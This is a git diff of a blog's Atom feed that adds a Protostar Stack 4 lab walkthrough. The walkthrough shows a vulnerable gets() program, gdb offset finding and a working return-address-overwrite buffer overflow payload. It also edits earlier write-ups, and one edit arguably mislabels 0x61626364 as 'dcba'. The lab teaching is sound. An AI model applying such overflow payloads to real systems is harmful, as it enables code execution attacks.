@@ -4,7 +4,7 @@
   <title><![CDATA[punMag]]></title>
   <link href="http://tungnh.github.io/atom.xml" rel="self"/>
   <link href="http://tungnh.github.io/"/>
-  <updated>2015-08-11T16:03:12+00:00</updated>
+  <updated>2015-08-11T17:18:52+00:00</updated>
   <id>http://tungnh.github.io/</id>
   <author>
     <name><![CDATA[Tung Pun]]></name>
@@ -124,7 +124,7 @@
 </span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
 
 
-<p>Not only overload <code>buffer</code>, we need make <code>modified</code>&rsquo;s value same as <code>0x61626364</code> (equal to <code>abcd</code> in ascii).
+<p>Not only overload <code>buffer</code>, we need make <code>modified</code>&rsquo;s value same as <code>0x61626364</code> (equal to <code>dcba</code> in ascii).
 Cuz the execute environment belongs to Little Endiance system, so you must <code>pack('&lt;I', targetvalue)</code></p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -257,9 +257,9 @@ Cuz the execute environment belongs to Little Endiance system, so you must <code
 </span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
 
 
-<p>In the end of this piece of code, the program call the function which has address stored in  <code>fp</code>&rsquo;s value. So, how to force the program call win function ? The first thought is overwrite   <code>win</code>&rsquo;s address to <code>fp</code> value.</p>
+<p>In the end of this piece of code, the program call the function which has address stored in <code>fp</code> &rsquo;s value. So, how to force the program to call <code>win</code> function ? The first thought is overwrite <code>win</code> &rsquo;s address to <code>fp</code> value.</p>
 
-<p>What is <code>win</code>&rsquo;s address ?</p>
+<p>But, what is <code>win</code>&rsquo;s address ?</p>
 
 <p>Using gdb (with <a href="https://github.com/longld/peda">peda</a>) we have:</p>
 
@@ -301,6 +301,208 @@ Cuz the execute environment belongs to Little Endiance system, so you must <code
 </span><span class='line'>➜  ./stack3 &lt; input3.b
 </span><span class='line'>calling function pointer, jumping to 0x08048424
 </span><span class='line'>code flow successfully changed</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>STACK 4</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>void win()
+</span><span class='line'>{
+</span><span class='line'>  printf("code flow successfully changed\n");
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>
+</span><span class='line'>  gets(buffer);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This piece of code is so brief. Same idea as Stack 3, we must change code flow to <code>win</code> function, however there is no <code>fb</code> for us overwrite.</p>
+
+<blockquote><p>It&rsquo;s time for EIP.</p></blockquote>
+
+<p>When disassembly main function, we have:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  gdb -q stack4
+</span><span class='line'>Reading symbols from stack4...done.
+</span><span class='line'>gdb-peda$ disass main
+</span><span class='line'>Dump of assembler code for function main:
+</span><span class='line'>   0x08048408 &lt;+0&gt;:     push   ebp
+</span><span class='line'>   0x08048409 &lt;+1&gt;:     mov    ebp,esp
+</span><span class='line'>   0x0804840b &lt;+3&gt;:     and    esp,0xfffffff0
+</span><span class='line'>   0x0804840e &lt;+6&gt;:     sub    esp,0x50
+</span><span class='line'>   0x08048411 &lt;+9&gt;:     lea    eax,[esp+0x10]
+</span><span class='line'>   0x08048415 &lt;+13&gt;:    mov    DWORD PTR [esp],eax
+</span><span class='line'>   0x08048418 &lt;+16&gt;:    call   0x804830c &lt;gets@plt&gt;
+</span><span class='line'>   0x0804841d &lt;+21&gt;:    leave
+</span><span class='line'>   0x0804841e &lt;+22&gt;:    ret
+</span><span class='line'>End of assembler dump.
+</span><span class='line'>gdb-peda$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After <code>leave</code> instructor in <code>*main+21</code>, the program will call the function which has address equal to <code>EIP register</code>&rsquo;s value. The easiest way to pass this level is overwrite EIP.</p>
+
+<p>First of all, we need <code>EIP</code> &rsquo;s offset. Try inject <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234567</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  gdb stack4
+</span><span class='line'>Reading symbols from stack4...done.
+</span><span class='line'>gdb-peda$ r
+</span><span class='line'>Starting program: /root/protostar/bin/stack4
+</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234567
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>[----------------------------------registers-----------------------------------]
+</span><span class='line'>EAX: 0xffffda90 ('A' &lt;repeats 74 times&gt;, "1234567")
+</span><span class='line'>EBX: 0x0
+</span><span class='line'>ECX: 0xf7fca5a0 --&gt; 0xfbad2288
+</span><span class='line'>EDX: 0xf7fcb87c --&gt; 0x0
+</span><span class='line'>ESI: 0x1
+</span><span class='line'>EDI: 0xf7fca000 --&gt; 0x1b5db0
+</span><span class='line'>EBP: 0x32314141 ('AA12')
+</span><span class='line'>ESP: 0xffffdae0 --&gt; 0x37 ('7')
+</span><span class='line'>EIP: 0x36353433 ('3456')
+</span><span class='line'>EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+</span><span class='line'>[-------------------------------------code-------------------------------------]
+</span><span class='line'>Invalid $PC address: 0x36353433
+</span><span class='line'>[------------------------------------stack-------------------------------------]
+</span><span class='line'>0000| 0xffffdae0 --&gt; 0x37 ('7')
+</span><span class='line'>0004| 0xffffdae4 --&gt; 0xffffdb74 --&gt; 0xffffdca3 ("/root/protostar/bin/stack4")
+</span><span class='line'>0008| 0xffffdae8 --&gt; 0xffffdb7c --&gt; 0xffffdcbe ("USER=root")
+</span><span class='line'>0012| 0xffffdaec --&gt; 0x0
+</span><span class='line'>0016| 0xffffdaf0 --&gt; 0x0
+</span><span class='line'>0020| 0xffffdaf4 --&gt; 0x0
+</span><span class='line'>0024| 0xffffdaf8 --&gt; 0xf7fca000 --&gt; 0x1b5db0
+</span><span class='line'>0028| 0xffffdafc --&gt; 0x8048218 --&gt; 0x675f5f00 ('')
+</span><span class='line'>[------------------------------------------------------------------------------]
+</span><span class='line'>Legend: code, data, rodata, value
+</span><span class='line'>Stopped reason: SIGSEGV
+</span><span class='line'>0x36353433 in ?? ()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We have &lsquo;0x36353433&rsquo; (equal to <code>3456</code> in ascii).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>payload = prefix + target_address
+</span><span class='line'>prefix = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next, we will find address of <code>win</code> function through the previous way.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ disass win
+</span><span class='line'>Dump of assembler code for function win:
+</span><span class='line'>   0x080483f4 &lt;+0&gt;:     push   ebp
+</span><span class='line'>   0x080483f5 &lt;+1&gt;:     mov    ebp,esp
+</span><span class='line'>   0x080483f7 &lt;+3&gt;:     sub    esp,0x18
+</span><span class='line'>   0x080483fa &lt;+6&gt;:     mov    DWORD PTR [esp],0x80484e0
+</span><span class='line'>   0x08048401 &lt;+13&gt;:    call   0x804832c &lt;puts@plt&gt;
+</span><span class='line'>   0x08048406 &lt;+18&gt;:    leave
+</span><span class='line'>   0x08048407 &lt;+19&gt;:    ret
+</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>=> 0x080483f4</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>payload = prefix + target_address
+</span><span class='line'>prefix = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12"
+</span><span class='line'>target_address = "\xf4\x83\x04\x08"
+</span><span class='line'>payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12" + "\xf4\x83\x04\x08"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Compose input file and inject to program</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  python2 -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12" + "\xf4\x83\x04\x08"' &gt; input4.b
+</span><span class='line'>➜  ./stack4 &lt; input4.b
+</span><span class='line'>code flow successfully changed
+</span><span class='line'>[1]    50114 segmentation fault (core dumped)  ./stack4 &lt; input4.b</span></code></pre></td></tr></table></div></figure>
 
 
 
